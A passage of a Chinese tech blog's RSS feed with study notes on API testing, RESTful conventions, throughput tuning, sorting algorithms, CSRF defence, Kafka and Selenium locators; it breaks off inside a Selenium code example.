&lt;li&gt;&lt;strong&gt;请求端口&lt;/strong&gt;：如果不填端口，默认是80，否则需要填写端口号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;接口路径&lt;/strong&gt;：指系统提供的接口在什么位置&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;接口参数&lt;/strong&gt;：参数在接口路径后，用“?”来表示路径地址完了，剩下的都是参数了，用“&amp;amp;”来区分参数个数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;参数值&lt;/strong&gt;： 接口参数的值&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3接口的http参数隐藏参数&#34;&gt;3.接口的HTTP参数【隐藏参数】&lt;/h2&gt;
&lt;h3 id=&#34;http请求方式&#34;&gt;http请求方式&lt;/h3&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  GET --- 通过请求URI得到资源
  POST --- 用于添加新的内容
  PUT --- 用于修改某个内容
  DELETE --- 删除某个内容
  CONNECT --- 用于代理进行传输，如使用SSL
  OPTIONS --- 询问可以执行哪些方法
  PATCH --- 部分文档更改
  PROPFIND (wedav) --- 查看属性
  PROPPATCH (wedav) --- 设置属性
  MKCOL (wedav) --- 创建集合（文件夹）
  COPY (wedav) --- 拷贝
  MOVE (wedav) --- 移动
  LOCK (wedav) --- 加锁
  UNLOCK (wedav) --- 解锁
  TRACE --- 用于远程诊断服务器
  HEAD --- 类似于GET, 但是不返回body信息，用于检查对象是否存在，以及得到对象的元数据
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;http请求头&#34;&gt;http请求头&lt;/h3&gt;
&lt;p&gt;请求头包含许多有关的客户端环境和请求正文的有用信息。例如，请求头可以声明浏览器所用的语言，请求正文的长度&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;  Accept:image/gif.image/jpeg./
  Accept-Language:zh-cn
  Connection:Keep-Alive
  Host:localhost
  User-Agent:Mozila/4.0(compatible:MSIE5.01:Windows NT5.0)
  Accept-Encoding:gzip,deflate.
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;http请求体&#34;&gt;http请求体&lt;/h3&gt;
&lt;p&gt;请求体就是请求等正文了，可以有很多种请求体。最常用的是 json格式&lt;/p&gt;
&lt;h2 id=&#34;4进行接口测试前的准备&#34;&gt;4.进行接口测试前的准备&lt;/h2&gt;
&lt;p&gt;做接口测试，需要开发提供接口文档。最重要的有这几点，确定了这些，才能做好接口测试。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;被测接口的地址&lt;/li&gt;
&lt;li&gt;接口参数，以及各个参数的说明&lt;/li&gt;
&lt;li&gt;必要的http头与http体 ( http头是可以自定义的，可以用来校验是否是自己人访问 )&lt;/li&gt;
&lt;li&gt;接口返回什么值，以及各个返回值的说明&lt;/li&gt;
&lt;li&gt;接口是干什么的&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5复杂一点的接口-restful&#34;&gt;5.复杂一点的接口 RESTful&lt;/h2&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291718587.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291718587.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一个用户接口可以通过以下4种不同方式的请求，来做不同的事情：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取用户信息&lt;/li&gt;
&lt;li&gt;创建用户&lt;/li&gt;
&lt;li&gt;修改用户&lt;/li&gt;
&lt;li&gt;删除用户&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;你完全可以像“灯”的那个例子，用GET请求来传递不同的参数来实现，但是这样如果接口多了，就会很混乱，很难管理。这时，我们需要一种规则：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当用“GET”方式时，只用来获取数据，成功了返回http状态码200&lt;/li&gt;
&lt;li&gt;当用“POST”方式时，只用来创建数据，成功了返回http状态码201&lt;/li&gt;
&lt;li&gt;当用“PUT”方式时，只用来修改数据，成功了返回http状态码203&lt;/li&gt;
&lt;li&gt;当用“DELETE”方式时，只用来删除数据，成功了返回http状态码204&lt;/li&gt;
&lt;li&gt;当请求发送失败，返回http状态码400&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这样子的规则，我们称它为 RESTful 标准。&lt;/p&gt;
&lt;h2 id=&#34;6如何进行接口测试&#34;&gt;6.如何进行接口测试&lt;/h2&gt;
&lt;p&gt;前面的搞清楚了，接口测试就简单了，无非就是这几个步骤。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拿到接口的url地址&lt;/li&gt;
&lt;li&gt;查看接口是用什么方式发送&lt;/li&gt;
&lt;li&gt;添加请求头，请求体&lt;/li&gt;
&lt;li&gt;发送查看返回结果，校验返回结果是否正确&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这是正常的一套流程，异常的情况，比如参数不传值，传的值不正确，明明要求用&amp;quot;GET&amp;quot;请求发送，偏要用&amp;quot;POST&amp;quot;请求发送等等，有很多异常情况，这里便不再举例。&lt;/p&gt;
&lt;h2 id=&#34;7接口文档的格式&#34;&gt;7.接口文档的格式&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;功能：获得指定节点的名字，简介，URL 及头像图片的地址。

https://www.v2ex.com/api/nodes/show.json
Method: GET
Authentication: None（鉴权，简单来说，就是要不要登录）

接受参数：
name: 节点名

例如：https://www.v2ex.com/api/nodes/show.json?name=python
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>随记—如何提高吞吐量</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E5%90%9E%E5%90%90%E9%87%8F/</link>
        <pubDate>Sun, 13 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E5%A6%82%E4%BD%95%E6%8F%90%E9%AB%98%E5%90%9E%E5%90%90%E9%87%8F/</guid>
        <description>&lt;h2 id=&#34;1服务器进程级别&#34;&gt;1.服务器（进程）级别&lt;/h2&gt;
&lt;p&gt;服务器级别增加网站吞吐量是诸多措施中最容易并且是效果最好的，如果一个网站能通过增加少量的服务器来提高吞吐量，应该优先采用。毕竟一台服务器的费用相比较一个程序员费用来说要低的多。但是有一个前提，就是你的服务器是系统的瓶颈，网站系统之后的其他系统并非瓶颈。如果你的系统的瓶颈在接口或者其他服务，盲目的增加服务器并不能解决你的问题。&lt;/p&gt;
&lt;p&gt;通过增加服务器来解决你的网站瓶颈，意味着你的网站需要做负载均衡。负载均衡(Load Balance)，其含义就是指将负载（工作任务）进行平衡、分摊到多个操作单元上进行运行，例如FTP服务器、Web服务器、企业核心应用服务器和其它主要任务服务器等，从而协同完成工作任务。负载均衡的方案，比如 LVS、Nginx、F5 等&lt;/p&gt;
&lt;h2 id=&#34;2线程级别&#34;&gt;2.线程级别&lt;/h2&gt;
&lt;p&gt;当一个请求到达服务器并且正确的被服务器接收之后，最终执行这个请求的载体是一个线程。当一个线程被CPU载入执行其指令的时候，在同步的状态下，当前线程会阻塞在那里等待CPU结果，如果CPU执行的是比较慢的IO操作，线程会一直被阻塞闲置很长时间，这里的很长是对比CPU的速度而言。当一个新的请求到来的时候，如果没有新的线程去领取这个任务并执行，要么会发生异常，要么创建新的线程。&lt;/p&gt;
&lt;p&gt;线程是一种很稀缺的资源，不可能无限制的创建。这种情况下我们就要把线程这种资源充分利用起来，不要让线程停下来。这也是程序推荐采用异步的原因。试想，一个线程不停的在工作，遇到比较慢的IO不会去等待结果，而是接着处理下一个请求，当IO的结果返回来得到通知的时候，线程再去取IO结果，岂不是能在相同时间内处理更多的请求。程序异步化（非阻塞）会明显提高系统的吞吐量，但是响应时间可能会稍微变大。&lt;/p&gt;
&lt;p&gt;还有一点，尽量减少线程上下文在CPU的切换，因为线程上线文切换的成本也是比较大的，在线程切换的时候，CPU需要把当前线程的上下文信息记录下来用以下次调用的时候使用，然后把新线程的上下文信息载入然后执行。这个过程相对于CPU的执行速度而言，要慢很多。&lt;/p&gt;
&lt;h2 id=&#34;3cpu级别&#34;&gt;3.CPU级别&lt;/h2&gt;
&lt;p&gt;现代操作系统都采用虚拟寻址的方式，它的寻址空间（虚拟存储空间）为4G（2的32次方）。操作系统将虚拟空间分为两类：内核空间和用户空间。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内核空间独立于用户空间，有访问受保护的内存空间、IO设备的权限（所有的用户空间共享）。&lt;/li&gt;
&lt;li&gt;用户空间就是我们的应用程序运行的空间，其实用户空间并没有操作各种IO设备的权限，像我们平时读取一个文件，本质上是委托内核空间去执行读取指令的，内核空间读取到数据之后再把数据复制到程序运行的空间，最后应用程序再把数据返回调用方。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;内核会为每个I/O设备维护一个 buffer（同一个文件描述符读和写的buffer不同），应用程序发出一个IO操作的指令其实通过了内核空间和用户空间两个部分，并且发生了数据的复制操作。这个过程其实主要包含两个步骤：用户进程发出操作指令并等待数据；内核把数据返回给用户进程（buffer的复制操作）。根据这两个操作的不同表现，所以IO模型有了同步阻塞，同步非阻塞，异步阻塞，异步非阻塞的概念。利用CPU提高系统吞吐量主要目标是提高单位时间内CPU运行的指令数，避免CPU做一些无用功。可以通过增加CPU的个数来增加吞吐量&lt;/p&gt;
&lt;p&gt;CPU负责把buffer的数据copy到应用程序空间，应用程序再把数据返回给调用方，假如这个过程发生的是一次Socket操作，应用程序在得到 IO 返回数据之后，还需要网卡把数据返回给client端，这个过程又需要把刚刚得到的buffer数据再次通过内核发送至网卡，通过网络传送出去。由此可见CPU把buffer数据copy到应用程序空间这个过程完全没有必要，在内核空间完全可以把buffer数据直接传输至网卡，这也是零拷贝技术要解决的问题。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;PS：零复制 (Zero-copy) 技术是指计算机执行操作时，CPU不需要先将数据从某处内存复制到另一个特定区域。这种技术通常用于通过网络传输文件时节省CPU周期和内存带宽。&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;4网络传输级别&#34;&gt;4.网络传输级别&lt;/h2&gt;
&lt;p&gt;由于协议大部分是TCP/IP，所以在协议传输方面优化的手段比较少，但是应用程序级别协议可以选择压缩率更好的，比如采用GRPC会比单纯的HTTP协议要好很多，HTTP2 要比HTTP 1要好很多。&lt;/p&gt;
&lt;p&gt;另外一方面网卡尽量加大传输速率，比如千兆网卡要比百兆网卡速度更快。由于网络传输比较偏底层，所以人工干预的切入点会少很多。&lt;/p&gt;
&lt;h2 id=&#34;5代码层&#34;&gt;5.代码层&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;加大应用的进程数，增加并发数，特别在进程数是瓶颈的情况下；&lt;/li&gt;
&lt;li&gt;优化线程调用，尽量线程池化；&lt;/li&gt;
&lt;li&gt;应用的代码异步化，特别是异步非阻塞式编程对于提高吞吐量效果特别明显；&lt;/li&gt;
&lt;li&gt;充分利用多核CPU优势，实现并行编程；&lt;/li&gt;
&lt;li&gt;减少每个调用的响应时间，缩短调用链，例如通过加索引的方式来减少访问一次数据库的时间；&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>随记—排序算法</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</link>
        <pubDate>Sat, 12 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/zwtgyh/p/10631760.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; 常见排序算法  @zwtgyh &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1冒泡排序&#34;&gt;1.冒泡排序&lt;/h2&gt;
&lt;h3 id=&#34;原理解析&#34;&gt;原理解析&lt;/h3&gt;
&lt;p&gt;选择第 1 个和第 2 个数字，如果第 1 个大于第 2 个，则二者交换位置（假设是升序排列）。之后选择第 2个和第 3 个数字，类似交换处理。一轮下来后，最大的数字会冒泡到最后一位。接下来，忽略已经排好的数字，对于剩下的数字再来一轮，直到所有的数字都排列完成。&lt;/p&gt;
&lt;h3 id=&#34;复杂度分析&#34;&gt;复杂度分析&lt;/h3&gt;
&lt;p&gt;若文件的初始状态是正序的，一趟扫描即可完成排序。所需的关键字比较次数 C 和记录移动次数 M 均达到最小值：Cmin = n-1，Mmin = 0，所以，冒泡排序最优的时间复杂度为 O(n)&lt;/p&gt;
&lt;p&gt;若初始文件是反序的，需要进行 n-1 趟排序。每趟排序要进行 n-1 次关键字的比较 ( 1 ≤ i ≤ n-1 )，且每次比较都必须移动记录三次来达到交换记录位置。在这种情况下，比较和移动次数均达到最大值：Cmax=n(n-1)/2，Mmax=3n(n-1)/2，冒泡排序的最坏时间复杂度为 O(n^2)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;平均的时间复杂度为：O(n^2)&lt;/li&gt;
&lt;li&gt;最优的空间复杂度，不需要借用第三方内存空间，则复杂度为0&lt;/li&gt;
&lt;li&gt;最差的空间复杂度，每次都要借用一次内存，按照实际的循环次数，为O(N)&lt;/li&gt;
&lt;li&gt;平均的空间负杂度为：O(1)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2插入排序&#34;&gt;2.插入排序&lt;/h2&gt;
&lt;h3 id=&#34;原理解析-1&#34;&gt;原理解析&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;从第一个元素开始，该元素可以认为已经被排序&lt;/li&gt;
&lt;li&gt;取出下一个元素，在已经排序的元素序列中从后向前扫描&lt;/li&gt;
&lt;li&gt;把取出的元素放到已排序的元素中间的合适位置&lt;/li&gt;
&lt;li&gt;重复步骤2~3&lt;/li&gt;
&lt;li&gt;就像排队一样，依次每次挑一个同学，把该同学插入到已经排好的部分队伍里。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;复杂度分析-1&#34;&gt;复杂度分析&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;最优的情况，当待排序数组是有序时，只需当前数跟前一个数比较一下就可以了，这时一共需要比较N-1次，时间复杂度为 O(N) 。&lt;/li&gt;
&lt;li&gt;最坏的情况，当待排序数组是逆序的，此时需要比较次数最多，总次数记为：1+2+3+…+N-1，所以，插入排序最坏情况下的时间复杂度为O(N^2) 。&lt;/li&gt;
&lt;li&gt;平均来说，A[1..j-1] 中的一半元素小于 A[j]，一半元素大于 A[j]。插入排序在平均情况运行时间与最坏情况运行时间一样，是输入规模的二次函数。&lt;/li&gt;
&lt;li&gt;插入排序的空间复杂度为常数阶O(1)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;3快速排序&#34;&gt;3.快速排序&lt;/h2&gt;
&lt;h3 id=&#34;原理解析-2&#34;&gt;原理解析&lt;/h3&gt;
&lt;p&gt;快速排序使用分治法策略来把一个序列分为两个子序列。其步骤为：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;从数列中挑出一个元素，称为基准，&lt;/li&gt;
&lt;li&gt;重新排序数列，所有比基准值小的元素摆放在基准前面，所有比基准值大的元素摆在基准后面（相同的数可以到任何一边）。在这个分区结束之后，该基准就处于数列的中间位置。这个称为分区（partition）操作。&lt;/li&gt;
&lt;li&gt;递归地（recursively）把小于基准值元素的子数列和大于基准值元素的子数列排序。&lt;/li&gt;
&lt;li&gt;递归到最底部时，数列的大小是零或一，也就是已经排序好了。这个算法一定会结束，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;复杂度分析-2&#34;&gt;复杂度分析&lt;/h3&gt;
&lt;p&gt;快速排序的一次划分算法从两头交替搜索，直到 low 和 hight 重合，因此其一次排序时间复杂度是 O(n)，所以整个快速排序算法的时间复杂度与划分的趟数有关。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;理想的情况是，每次划分所选择的中间数恰好将当前序列几乎等分，经过 log2n 趟划分，便可得到长度为 1 的子表。这样，整个算法的时间复杂度为 O(nlog2n)。&lt;/li&gt;
&lt;li&gt;最坏的情况是，每次所选的中间数是当前序列中的最大或最小元素，这使得每次划分所得的子表中一个为空表，另一子表的长度为原表的长度 -1。这样，长度为n的数据表的快速排序需要经过 n 趟划分，使得整个排序算法的时间复杂度为 O(n^2)。&lt;/li&gt;
&lt;li&gt;为改善最坏情况下的时间性能，可采用其他方法选取中间数。通常采用三者值取中方法，即比较 H-&amp;gt;r[low].key、H-&amp;gt;r[high].key 与 H-&amp;gt;r[(low+high)/2].key，取三者中关键字为中值的元素为中间数。&lt;/li&gt;
&lt;li&gt;从空间性能上看，尽管快速排序只需要一个元素的辅助空间，但快速排序需要一个栈空间来实现递归。最好的情况下，即快速排序的每一趟排序都将元素序列均匀地分割成长度相近的两个子表，所需栈的最大深度为 log2(n+1)；但最坏的情况下，栈的最大深度为n。这样，快速排序的空间复杂度为 O(log2n)。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>随记—什么是 CSRF</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-csrf/</link>
        <pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-csrf/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://zhuanlan.zhihu.com/p/22521378&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; CSRF 是什么？@饥人谷若愚 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是-csrf-跨站请求伪造&#34;&gt;1.什么是 CSRF 跨站请求伪造&lt;/h2&gt;
&lt;p&gt;CSRF (Cross Site Request Forgery)攻击，中文名：跨站请求伪造。其原理是攻击者构造网站后台某个功能接口的请求地址，诱导用户去点击或者用特殊方法让该请求地址自动加载。这样，当用户在登录状态下请求这个地址时，服务端就会以为这个非法操作是用户合法的操作。&lt;/p&gt;
&lt;h2 id=&#34;2如何避免&#34;&gt;2.如何避免&lt;/h2&gt;
&lt;p&gt;在客户端防范方面：对于数据库的修改请求，全部使用 POST 提交，禁止使用 GET 请求。在服务器端防范方面：一般的做法是在表单里面添加一段隐藏的唯一的 token (请求令牌)。比如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;服务端在收到路由请求时，生成一个随机数，在渲染请求页面时把随机数埋入页面（一般埋入 form 表单内）&lt;/li&gt;
&lt;li&gt;服务端设置 setCookie，把该随机数作为 cookie 或者 session 种入用户浏览器&lt;/li&gt;
&lt;li&gt;当用户发送 GET 或者 POST 请求时带上 csrf_token 参数（对于 Form 表单直接提交即可，因为会自动把当前表单内所有的 input 提交给后台，包括 csrf_token）&lt;/li&gt;
&lt;li&gt;后台在接受到请求后解析请求的 cookie 获取 csrf_token 的值，然后和用户请求提交的 csrf_token 做个比较，如果相等表示请求是合法的&lt;/li&gt;
&lt;li&gt;尽量少用 GET。假如攻击者在我们的网站上传了一张图片，用户在加载图片的时候实际上是向攻击者的服务器发送了请求，这个请求会带有 referer 表示当前图片所在的页面的  url。 而如果使用 GET 方式接口的话这个 URL 就形如：https://xxxx.com/gift?giftId=aabbcc&amp;amp;_csrf_token=xxxxx，把 token 接在 URL 后面，那相当于攻击者获取了 csrf_token ，短时间内可以使用这个 token 来操作其他 GET 接口。&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>随记—什么是 Kafka</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-kafka/</link>
        <pubDate>Thu, 10 Sep 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BB%80%E4%B9%88%E6%98%AF-kafka/</guid>
        <description>&lt;blockquote&gt;
&lt;p&gt;参考原文：&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/liangmingshen/p/11031426.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Kafka 初识  @暮良文王 &lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;1什么是-kafka&#34;&gt;1.什么是 KafKa&lt;/h2&gt;
&lt;p&gt;Kafka（Apache Kafka）是一款开源的消息引擎系统 （Messaging System），根据维基百科的定义：消息引擎系统是一组规范，企业利用这组规范在不同系统之间传递语义准确的消息，实现松耦合的异步式数据传递。简单来说消息引擎的作用就是实现以下的功能&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;系统 A 发送消息给消息引擎系统&lt;/li&gt;
&lt;li&gt;系统 B 从消息引擎系统中读取 A 发送的消息。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;2kafka-如何设计信息&#34;&gt;2.Kafka 如何设计信息&lt;/h2&gt;
&lt;p&gt;Kafka 使用的是纯二进制的字节序列。如果我们在设计消息使用了 CSV、XML 亦或是 JSON 这些结构化的框架，那么在发送给 Kafka 前都要将其转换成二进制的字节序列。&lt;/p&gt;
&lt;h2 id=&#34;3kafka-如何传递消息&#34;&gt;3.Kafka 如何传递消息&lt;/h2&gt;
&lt;p&gt;Kafka 同时支持两种消息引擎模型，即：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;点对点模型&lt;/strong&gt;：也叫消息队列模型。即系统 A 发送的消息只能被系统 B 接收，其他任何系统都不能读取 A 发送的消息。日常生活的例子比如电话客服就属于这种模型：同一个客户呼入电话只能被一位客服人员处理，第二个客服人员不能为该客户服务。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;发布 / 订阅模型&lt;/strong&gt;：与上面不同的是，它有一个主题（Topic）的概念，你可以理解成逻辑语义相近的消息容器。该模型也有发送方和接收方，只不过提法不同。发送方也称为发布者（Publisher），接收方称为订阅者（Subscriber）。和点对点模型不同的是，这个模型可能存在多个发布者向相同的主题发送消息，而订阅者也可能存在多个，它们都能接收到相同主题的消息。生活中的报纸订阅就是一种典型的发布 / 订阅模型。　&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;4为什们要使用-kafka&#34;&gt;4.为什们要使用 Kafka&lt;/h2&gt;
&lt;p&gt;为什么系统 A 不能直接发送消息给系统 B，中间还要隔一个消息引擎呢？为什么要使用 Kafka 呢？&lt;/p&gt;
&lt;p&gt;这里的答案是&lt;strong&gt;削峰填谷&lt;/strong&gt;。所谓的削峰填谷就是指缓冲上下游瞬时突发流量，使其更平滑。特别是对于那种发送能力很强的上游系统，如果没有消息引擎的保护，脆弱的下游系统可能会直接被压垮导致全链路服务雪崩。但是，一旦有了消息引擎，它能够有效地对抗上游的流量冲击，真正做到将上游的峰填满到谷中，避免了流量的震荡。消息引擎系统的另一大好处在于发送方和接收方的松耦合，这也在一定程度上简化了应用的开发，减少了系统间不必要的交互。&lt;/p&gt;
&lt;p&gt;举个简单例子来说，比如购买课程，每门课程都有一个专门的订阅按钮，点击之后进入到付费页面。这个流程可以简单的看成这样：点击订阅按钮调用订单系统生成对应的订单，这是上游。处理该订单会依次调用多个子系统服务 ，比如调用支付宝和微信支付的接口、查询你的登录信息、验证课程信息等，这是下游。显然上游的生成订单的操作比较简单，它的TPS要远高于处理订单的下游服务，因此如果上下游系统直接对接，势必会出现下游服务无法及时处理上游订单从而造成订单堆积的情形。特别是当出现类似于秒杀这样的业务时，上游订单流量会瞬时增加，可能出现的结果就是直接压跨下游子系统服务。&lt;/p&gt;
&lt;p&gt;解决此问题的一个常见做法是我们对上游系统进行限速，但这种做法对上游系统而言显然是不合理的，毕竟问题并不出现在它那里。所以更常见的办法是引入像 Kafka 这样的消息引擎系统来对抗这种上下游系统 TPS 的错配以及瞬时峰值流量。&lt;/p&gt;
&lt;p&gt;当引入了 Kafka 之后。上游订单服务不再直接与下游子服务进行交互。当新订单生成后它仅仅是向 Kafka Broker 发送一条订单消息即可。类似地，下游的各个子服务订阅 Kafka 中的对应主题，并实时从该主题的各自分区（Partition）中获取到订单消息进行处理，从而实现了上游订单服务与下游订单处理服务的解耦。这样当出现秒杀业务时，Kafka 能够将瞬时增加的订单流量全部以消息形式保存在对应的主题中，既不影响上游服务的 TPS，同时也给下游子服务留出了充足的时间去消费它们。这就是 Kafka 这类消息引擎系统的最大意义所在。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Python—Selenium</title>
        <link>https://ac-lm.github.io/posts/python/pythonselenium/</link>
        <pubDate>Mon, 22 Jun 2020 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/pythonselenium/</guid>
        <description>&lt;h2 id=&#34;1什么-selenium&#34;&gt;1.什么 Selenium&lt;/h2&gt;
&lt;p&gt;Selenium是一个用于测试网站的自动化测试工具，支持各种浏览器，如Chrome、Firefox、Edge等。&lt;/p&gt;
&lt;h2 id=&#34;2安装&#34;&gt;2.安装&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;pip install Selenium
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3使用前提&#34;&gt;3.使用前提&lt;/h2&gt;
&lt;p&gt;Selenium的使用是基于浏览器驱动webdriver来启动与操作网页的，因此想要正常的进行Selenium自动化测试就必须获取对应浏览器的webdriver驱动文件。同时在环境变量中配置Path的属性，令其指向放置webdriver驱动文件的文件夹，或在程序中指定webdriver驱动文件的位置&lt;/p&gt;
&lt;h2 id=&#34;4selenium-的定位方法&#34;&gt;4.Selenium 的定位方法&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;|元素               | 定位一个元素                       | 含义                 
|-------------------| --------------------------------- | -------------------
|id                 | find_element_by_id                | 通过元素id定位        
|name               | find_element_by_name              | 通过元素name定位      
|xpath              | find_element_by_xpath             | 通过xpath表达式定位  
|link_texr          | find_element_by_link_text         | 通过完整超链接定位   
|partial_link_text  | find_element_by_partial_link_text | 通过部分链接定位      
|tag_name           | find_element_by_tag_name          | 通过标签定位          
|class_name         | find_element_by_class_name        | 通过类名进行定位      
|css_selector       | find_elements_by_css_selector     | 通过css选择器进行定位 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;对象的定位是自动化测试的核心，要想操作一个对象，首先应该识别这个对象。一个对象就像一个人一样，他会有各种的特征（属性），我们可以通过这个属性找到这对象。以百度搜索的输入框为例，有以下属性（F12查看）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;input id=&amp;quot;kw&amp;quot; class=&amp;quot;s_ipt&amp;quot; name=&amp;quot;wd&amp;quot; value=&amp;quot;&amp;quot; maxlength=&amp;quot;255&amp;quot; autocomplete=&amp;quot;off&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;我们可以这样来定位属性（这里请注意CSS和xpath，本文中不做深入探讨，但是最常用的定位方式）&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;通过id方式定位：browser.find_element_by_id(&amp;quot;kw&amp;quot;)
通过name方式定位：browser.find_element_by_name(&amp;quot;wd&amp;quot;)
通过tag name方式定位：browser.find_element_by_tag_name(&amp;quot;input&amp;quot;)
通过class name 方式定位：browser.find_element_by_class_name(&amp;quot;s_ipt&amp;quot;)
通过CSS方式定位：
browser.find_element_by_css_selector(&amp;quot;#kw&amp;quot;)
browser.find_element_by_css_selector(&amp;quot;html &amp;gt; body &amp;gt; form &amp;gt; span &amp;gt; input&amp;quot;)
通过xpath方式定位：
browser.find_element_by_xpath(&amp;quot;//input[@id=&#39;kw&#39;]&amp;quot;)
browser.find_element_by_xpath(&amp;quot;/html/body/form/span/input&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;复数元素的定位，只要在find_element后面加上s便可，返回的是元素的列表&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;elements = driver.find_elements_by_xpath(&#39;//div/h3/a&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;5浏览器的操控&#34;&gt;5.浏览器的操控&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;| 方法                | 说明                  
| ------------------- | ----------------------
| set_window_size()   | 设置浏览器的大小       
| back()              | 控制浏览器后退         
| forward()           | 控制浏览器前进         
| refresh()           | 刷新当前页面           
| clear()             | 清除文本               
| send_keys (value)   | 模拟按键输入           
| click()             | 单击元素               
| submit()            | 用于提交表单           
| get_attribute(name) | 获取元素属性值         
| is_displayed()      | 设置该元素是否用户可见 
| size                | 返回元素的尺寸         
| text                | 获取元素的文本         
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用举例&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;from selenium import webdriver
